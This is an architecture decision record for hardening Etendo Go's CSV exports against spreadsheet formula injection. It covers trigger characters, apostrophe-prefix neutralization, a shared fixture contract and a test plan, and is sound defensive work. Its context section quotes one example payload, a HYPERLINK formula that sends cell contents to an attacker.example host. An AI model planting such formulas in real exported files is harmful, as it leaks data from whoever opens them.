# ADR-0004 — Spreadsheet formula neutralization for CSV exports

- **Status:** Proposed
- **Date:** 2026-07-29
- **Deciders:** Etendo Go backend (ETP-4569 assessment)
- **Jira:** ETP-4569 (assessment / this ADR) · ETP-4568 (implementation, Backend 1/3) · Epic ETP-3504
- **Source:** [PRD — Client & Delivery Security Hardening](https://etendoproject.atlassian.net/wiki/spaces/PYPI/pages/5106892804/), WS-5 / SEC-04
- **Finding:** SEC-04 (Critical) — "Formula injection in CSV export" (CWE-1236)

> Part of the ETP-4569 assessment (PRD phase P0). This ADR fixes the output contract so that
> ETP-4568 can be implemented test-first without re-litigating the escaping strategy.

---

## Context

### The vulnerability

Values beginning with `=`, `+`, `-`, `@`, TAB, CR or LF are interpreted as **formulas** when a CSV
is opened in Excel, LibreOffice Calc or Google Sheets. Because Etendo Go exports user- and
partner-controlled data (business partner names, descriptions, document references, error text), a
stored value such as `=HYPERLINK("https://attacker.example/?d="&A1,"Click")` becomes an active
formula in the recipient's spreadsheet. Consequences: data exfiltration, phishing links, and — via
legacy DDE — command execution.

The victim is **not** the Etendo user who exports; it is whoever opens the file. That makes this an
**output-encoding** problem, which is why the PRD explicitly pulls SEC-04 out of the deferred
"forms validation" bucket (SEC-01…07) and treats it as critical.

### Verified current state (2026-07-30)

Four CSV-producing paths exist across the three repos. **They do not agree on anything** — neither
on formula neutralization, nor on quoting, nor on line endings.

| Path | Repo | Neutralizes formulas? | Quoting | Line ending |
|---|---|---|---|---|
| `NeoCsvExportService.csvField()` | `com.etendoerp.go` | 🟡 Classic `= + - @` after whitespace (ETP-4560) | Always quote | CRLF |
| `FmPrimitives.buildCsvAndDownload()` (`:171-179`) | `schema_forge` (fiscal-monitor) | ❌ **No** (own inline escaping) | Always quote | **LF** (`join('\n')`) |
| `csvSerializer.csvField()` (`:20-26`) | `schema_forge_core` | 🟡 Same classic policy (ETP-4559) | Conditional (`/[",\n]/`) | n/a (caller joins) |
| `ImportReviewQueue.buildErrorsCsv()` + `buildTemplateCsv()` | `schema_forge_core` | 🟡 Delegates to the classic policy | Conditional | LF |

Backend format details, confirmed by reading `NeoCsvExportService.java`: UTF-8 BOM (`:72-73`,
`﻿`), CRLF (`:74`), comma delimiter, every field quoted (`:238-241`), served as
`text/csv; charset=UTF-8` (`:104`). Header labels (`:140`) and data cells (`:156`) both flow through
`csvField()`.

### Two findings that materially change the approach

**1. A shared policy shape already exists — and is tested on both runtimes.**
`schema_forge_core/packages/app-shell-core/src/lib/csv/csvSerializer.js` already implements the
apostrophe-prefix strategy with a unit test suite (`lib/csv/__tests__/csvSerializer.test.js`
asserting `=1+1`, `+SUM(A1:A2)`, `-CMD`, `@SUM(A1:A2)`). `NeoCsvExportService` now implements and tests the same classic policy through ETP-4560. This ADR therefore **widens and propagates an existing policy** rather than inventing a strategy.

**2. The parity docstring is now true only for the narrower, classic policy.**
`csvSerializer.js:6-7` states:

> *"Mirrors the server-side policy in NeoCsvExportService.java (com.etendoerp.go) so both sides
> neutralize the same inputs."*

This became accurate for `= + - @` when ETP-4560 landed, but it can still be misread as proof that the full PRD contract is closed. Both implementations omit full-width variants and treat TAB/CR/LF as skippable prefixes rather than standalone triggers. ETP-4568 must update the comment to name the normative fixture contract, not another implementation.

### Gap in the existing primitive vs. the PRD contract

`isFormulaInjection()` (`csvSerializer.js:9-13`) skips leading whitespace and then tests the first
significant character against `=+-@`. The PRD and OWASP require a **broader** trigger set:

- **TAB, CR and LF are triggers in their own right.** Today they are treated as skippable leading
  whitespace (`/\s/`), so a value that *starts* with TAB is not neutralized unless the character
  after it also happens to be a trigger.
- **Agreed full-width equivalents** (e.g. `＝`, `＋`) are not handled at all.

Both primitives have the right *shape* but a narrower *trigger set* than the target contract.

---

## Decision

### D1 — Output contract: human spreadsheet export, not a machine interchange format

Ratifying PRD §7. List exports and import-error reports are **human-facing spreadsheet files**:

- **Excel desktop is the primary target.** LibreOffice Calc and Google Sheets import are supported
  compatibility targets.
- They are **not** a machine-integration or lossless round-trip contract. Programmatic consumers use
  NEO JSON.
- If a raw CSV contract becomes necessary later, it gets a **separately named and versioned format**.
  **No unsafe-mode query parameter is ever exposed on the UI export path** — that would let an
  attacker request the vulnerable encoding.
- Import templates and parsers remain a separate interchange contract and are out of scope.

**Consequence, accepted explicitly:** a visible leading apostrophe in some consumers is an accepted
trade-off. This is the trade the PRD already approved; do not reopen it during implementation.

### D2 — One shared neutralization policy, two implementations, one fixture set

There is no shared runtime between Java and JavaScript, so the policy is enforced as a
**specification plus a common fixture set**, not as shared code:

```
docs/security/csv-neutralization-fixtures.md   ← canonical trigger/expected-output table
        │
        ├── com.etendoerp.go  → NeoCsvExportService (JUnit)
        └── schema_forge_core → csvSerializer.js   (Vitest / node:test)
                                       ↑
                                schema_forge → fiscal-monitor delegates here
```

Every implementation must satisfy the same fixture table. When a trigger is added, it is added to
the fixture table first, then to both implementations.

### D3 — Trigger set and algorithm

A value is formula-sensitive when, **after normalizing leading BOM and Unicode whitespace/control
characters**, its first significant character is one of:

| Trigger | Rationale |
|---|---|
| `=` `+` `-` `@` | Classic formula initiators (all three target consumers) |
| TAB (`\t`), CR (`\r`), LF (`\n`) | OWASP-identified initiators; **triggers themselves**, not merely skippable |
| Agreed full-width variants (`＝`, `＋`, `－`, `＠`) | OWASP notes full-width bypasses |

Neutralization: **prepend a single ASCII apostrophe (`'`)**.

Ordering is normative and must be asserted by tests:

```
formatValue()  →  neutralizeSpreadsheetCell()  →  RFC 4180 quoting
```

Neutralization happens **after** value formatting (so date reformatting is not disturbed) and
**before** quoting (so the apostrophe lands inside the quoted field, not outside it). Applied to
**header labels and every data cell** — headers are attacker-influenced wherever column labels derive
from AD field names or user configuration.

### D4 — Presentation format is preserved exactly

The neutralization must not change the export's observable format. Locked by characterization tests
written **before** the security fix:

- UTF-8 BOM preserved (`NeoCsvExportService.java:72-73`, `:109`)
- Comma delimiter
- Every field quoted (backend) — the existing always-quote behavior stays
- CRLF line endings (backend)
- `text/csv; charset=UTF-8` content type, `.csv` filename suffix logic (`:278-279`)

> **Known divergence, deliberately left alone in this change.** The frontend paths use LF and
> conditional quoting; the backend uses CRLF and always-quote. Unifying them is a presentation
> change with its own compatibility risk and is **not** part of a security fix. Recorded here as
> technical debt so the next reader does not assume it was an oversight.

### D5 — Scope: all four paths

| Path | Action |
|---|---|
| `NeoCsvExportService.csvField()` | Widen the ETP-4560 trigger set per D3 and bind it to the canonical fixtures |
| `csvSerializer.csvField()` | Widen the trigger set per D3 and document the fixture contract |
| `FmPrimitives.buildCsvAndDownload()` | Stop hand-rolling escaping; delegate to `csvSerializer.csvField()` |
| `ImportReviewQueue` / `buildTemplateCsv` | No change needed — already delegate. Add fixture coverage as regression guard |

Import **template headers** are reviewed defensively without changing normal aliases (a template
header that starts with `-` must not silently become `'-`, breaking the round-trip with the parser).

**Out of scope:** PDF export. PDF has no spreadsheet formula semantics; the PRD explicitly forbids
broadening the requirement there.

---

## Consequences

**Positive**
- Closes SEC-04, one of the two critical findings.
- Replaces ambiguous implementation-parity documentation with a normative fixture contract.
- Converges four divergent CSV paths onto one documented policy.
- The frontend already ships a tested implementation → lower risk, and the fixture table gives the
  backend a red-test target on day one.

**Negative / costs**
- A visible leading apostrophe in some consumers (accepted in D1).
- Cross-repo change: three repos, three test suites, one shared fixture doc.
- Compatibility fixtures require **manual verification** in Excel desktop, Calc and Sheets, including
  save-and-reopen. This cannot be fully automated in CI and is the main cost driver of ETP-4568.

**Neutral**
- `NeoCsvExportService` is small and self-contained; the change is local to `csvField()` plus a new
  helper.

---

## Testing (TDD, red-first)

Per PRD §6, characterization tests come **before** the security tests, so a format regression is
distinguishable from a security fix.

**1. Characterization (Red → must pass unchanged after the fix)**
- BOM present, comma delimiter, all fields quoted, CRLF line endings.
- Date columns still reformatted to `dd-MM-yyyy` (`formatDateDayMonthYear`).
- Content type and `.csv` filename suffix behavior.

**2. Security (Red → Green)**
- Each trigger from D3 in the first position, for a data cell **and** a header label.
- Triggers hidden behind leading whitespace, TAB, CR, LF and BOM.
- Full-width variants.
- Embedded delimiters, quotes and newlines **combined with** a trigger (asserts the
  neutralize-then-quote ordering).
- Values that must **not** be touched: plain text, negative numbers rendered by `formatValue`, dates,
  empty string, `null` / `JSONObject.NULL`.

> Negative numbers are the interesting edge: `-1500.00` starts with a trigger character. Per D1 this
> export is human-facing, so neutralizing it is *correct but visible*. The fixture table must state
> the expected output for negative numeric cells explicitly, and the decision must be taken with the
> functional owner before implementation — it is the single most likely source of user-visible
> complaint.

**3. Compatibility fixtures (manual, evidence attached to ETP-4568)**
- Generated file opened in Excel desktop, LibreOffice Calc, Google Sheets.
- Each trigger renders as **literal text**, no formula evaluation, no leading-`'` data loss.
- Re-verified **after save and reopen** in each consumer.

Module idiom for the backend: JUnit 4 + the existing test layout under
`modules/com.etendoerp.go/src-test/`. Frontend: existing `lib/csv/__tests__/csvSerializer.test.js`
extended (delegate test authoring to the Tester agent per the repos' CLAUDE.md rule).

---

## Open questions for ETP-4568

1. **Negative numbers** — neutralize (safe, visible) or exempt values that parse as a number
   (friendlier, and reintroduces a parser-dependent bypass surface)? Needs the functional owner.
2. **Full-width variant list** — which exact code points are "agreed"? Requires a decision to avoid
   an open-ended Unicode chase.
3. **Fiscal-monitor line endings** — while delegating to `csvSerializer`, do we also switch that path
   to CRLF for consistency with the backend? Recommendation: **no**, keep it out of a security fix
   (see D4).
